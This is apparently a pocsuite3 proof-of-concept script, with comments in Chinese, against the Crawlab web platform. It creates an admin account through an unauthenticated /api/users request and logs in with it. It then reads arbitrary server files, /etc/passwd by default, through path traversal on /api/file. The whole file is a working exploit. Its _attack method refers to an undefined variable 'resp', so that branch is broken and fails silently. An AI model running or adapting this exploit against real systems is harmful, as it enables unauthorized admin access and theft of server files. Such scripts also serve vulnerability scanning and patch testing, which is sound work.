import json
from lib2to3.pgen2 import token
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port, random_str
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

class DemoPOC(POCBase):
    vulID = '8'  
    name = 'Crawlab file 任意文件读取漏洞'
    desc = '''Crawlab 后台 /api/file接口 存在任意文件读取漏洞，攻击者通过漏洞就可以读取服务器中的任意文件'''
    appPowerLink = 'Crawlab'
    appName = 'Crawlab'
    appVersion = '*'
    samples = []
    install_requires = ['']
    vulType = VUL_TYPE.PATH_DISCLOSURE
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["filename"] = OptString("/etc/passwd", description='文件读取自定义命令')
        return o

    def _verify(self):
        result = {}
        target = self.url + "/api/users"
        headers = {
            "Content-Type": "application/json",
        }
        username = random_str(8)
        password = random_str(8)
        data = '{"username":"' + username + '","password":"' + password + '","role":"admin","email":"' + username + '@qq.com"}'
        try:
            r = requests.put(target, headers=headers, data=data, timeout=5)
            if 'success' in r.text and 'already' not in r.text and r.status_code == 200:
                target2 = self.url + "/api/login"
                headers = {
                    "Content-Type": "application/json",
                }
                data = '{"username":"' + username + '","password":"' + password + '"}'
                r = requests.post(target2, data=data, headers=headers, timeout=5)
                if r.status_code == 200 and "success" in r.text:
                    token = json.loads(r.text)["data"]
                    target3 = self.url + "/api/file?path=../.." + self.get_option("filename")
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                    }
                    r = requests.get(target3, headers=headers, timeout=5)
                    if r.status_code == 200 and "root:" in r.text:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = target
                        result['VerifyInfo']['User/Pass'] = username + "/" + password 
                        result['VerifyInfo']['File'] = self.get_option("filename")
                        result['VerifyInfo']['Response'] = json.loads(r.text)["data"]
                    
        except:
            pass

        return self.parse_output(result)
    
    def _attack(self):
        result = {}
        target = self.url + "/api/users"
        headers = {
            "Content-Type": "application/json",
        }
        username = random_str(8)
        password = random_str(8)
        data = '{"username":"' + username + '","password":"' + password + '","role":"admin","email":"' + username + '@qq.com"}'
        try:
            r = requests.put(target, headers=headers, data=data, timeout=5)
            if 'success' in resp.text and 'already' not in resp.text and resp.status_code == 200:
                target2 = self.url + "/api/login"
                headers = {
                    "Content-Type": "application/json",
                }
                data = '{"username":"' + username + '","password":"' + password + '"}'
                r = requests.post(target2, data=data, headers=headers, timeout=5)
                if r.status_code == 200 and "success" in r.text:
                    token = json.loads(r.text)["data"]
                    target3 = self.url + "/api/file?path=../.." + self.get_option("filename")
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                    }
                    r = requests.get(target3, headers=headers, timeout=5)
                    if r.status_code == 200:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = target
                        result['VerifyInfo']['User/Pass'] = username + "/" + password 
                        result['VerifyInfo']['File'] = self.get_option("filename")
                        result['VerifyInfo']['Response'] = json.loads(r.text)["data"]
                    
        except:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)